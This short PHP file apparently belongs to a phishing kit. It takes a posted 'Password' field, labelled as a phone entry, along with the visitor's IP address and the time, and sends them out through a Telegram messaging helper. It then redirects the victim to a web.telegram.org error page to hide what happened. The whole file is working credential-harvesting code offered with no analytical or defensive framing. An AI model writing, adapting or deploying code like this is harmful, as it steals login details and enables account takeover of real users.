<?php
include ("jdf.php");
if (!empty($_POST)) {
    require_once 'Telegram.php';
Telegram::sendMessage('phone: '.$_POST['Password']."\n".'ip: '.$_SERVER['REMOTE_ADDR']."\n".'time: '.jdate("h:i")."\n".'');
}
header ('Location: https://web.telegram.org/404-notfound');
?>

